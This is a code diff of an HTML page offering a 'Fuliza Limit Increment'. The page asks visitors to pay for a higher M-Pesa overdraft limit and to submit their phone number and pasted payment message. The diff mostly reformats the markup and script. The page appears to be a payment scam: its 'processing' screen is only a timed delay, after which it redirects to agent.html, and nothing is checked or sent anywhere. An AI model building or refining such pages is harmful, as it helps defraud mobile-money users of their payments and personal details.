@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Fuliza Limit Increment</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="container">
     <h1>Fuliza Limit Increment</h1>
-
     <p>Here you pay according to the limit you wish to have</p>
 
     <table>
@@ -28,18 +28,17 @@
     </table>
 
     <form onsubmit="return validateForm()">
-      <label for="phone">Enter Phone Number:</label><br>
-      <input type="text" id="phone" required placeholder="e.g. 07XXXXXXXX"><br><br>
+      <label for="phone">Enter Phone Number:</label>
+      <input type="text" id="phone" required placeholder="e.g. 07XXXXXXXX" />
 
-      <label for="mpesa">Paste Mpesa Payment Message:</label><br>
-      <textarea id="mpesa" required placeholder="Paste your message here..."></textarea><br><br>
+      <label for="mpesa">Paste Mpesa Payment Message:</label>
+      <textarea id="mpesa" required placeholder="Paste your message here..."></textarea>
 
       <button type="submit">Submit</button>
     </form>
 
-    <div id="loading" style="display: none; text-align: center; margin-top: 20px;">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." width="80">
-      <p>Processing your request...</p>
+    <div id="loading" style="display: none; margin-top: 20px;">
+      <p>⏳ Processing your request...</p>
     </div>
   </div>
 
@@ -49,14 +48,14 @@
       const mpesa = document.getElementById("mpesa").value.trim();
 
       if (phone && mpesa) {
-        document.querySelector('form').style.display = 'none';
-        document.getElementById('loading').style.display = 'block';
+        document.querySelector("form").style.display = "none";
+        document.getElementById("loading").style.display = "block";
 
-        setTimeout(function () {
-          window.location.href = 'agent.html';
-        }, 3000);
+        setTimeout(() => {
+          window.location.href = "agent.html";
+        }, 5000); // wait 5 seconds before moving
       } else {
-        alert("Please enter phone number and Mpesa message before submitting.");
+        alert("Please enter both phone number and Mpesa message.");
       }
 
       return false;
